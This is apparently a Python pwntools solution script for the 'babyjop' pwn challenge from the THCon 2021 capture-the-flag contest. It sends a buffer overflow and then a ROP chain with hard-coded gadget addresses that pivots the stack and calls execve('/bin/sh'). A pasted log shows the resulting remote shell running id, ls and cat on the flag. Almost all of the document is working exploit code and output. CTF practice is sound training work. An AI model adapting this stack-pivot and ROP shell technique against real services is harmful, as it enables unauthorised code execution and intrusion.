from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './babyjop'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "remote1.thcon.party"
  PORT = 10902
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

mov_esp_esi = 0x452781 # mov esp,esi, ... ret 
pop_rdi_ret = 0x4018ca # pop rdi; ret;
pop_rsi_ret = 0x40f4fe # pop rsi; ret;
pop_rdx_ret = 0x4017cf # pop rdx; ret;
pop_rax_ret = 0x451f27 # pop rax; ret;
syscall_ret = 0x41e7a4 # syscall; ret;
content_addr= 0x4c3300 

s.recvuntil("Your age: \n")
s.sendline("1")
s.recvuntil("Your name: ")

buf  = b"A"*128
buf += p32(0x401e8a)
s.send(buf)

sleep(0.5)
buf  = b"/bin/sh\x00"
buf += b"B"*(88-len(buf))
buf += p64(pop_rdi_ret) + p64(content_addr)
buf += p64(pop_rsi_ret) + p64(0)
buf += p64(pop_rdx_ret) + p64(mov_esp_esi)
buf += p64(pop_rdx_ret) + p64(0)
buf += p64(pop_rax_ret) + p64(0x3b)
buf += p64(syscall_ret)
s.send(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/THC_CTF_2021/Pwn_Babyjop_250$ python solve.py r
[*] '/home/mito/CTF/THC_CTF_2021/Pwn_Babyjop_250/babyjop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to remote1.thcon.party on port 10902: Done
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ ls -l
total 924
-rwxr-xr-x 1 root root 872136 Jun  8 20:45 babyjop
-rw------- 1 user user 335872 Jun 15 04:42 core
-rw-r--r-- 1 root root     33 Jun  8 20:45 flag.txt
$ cat flag.txt
THCon21{J0P_1t_l1k3_1t5_h0o0t!!}
'''
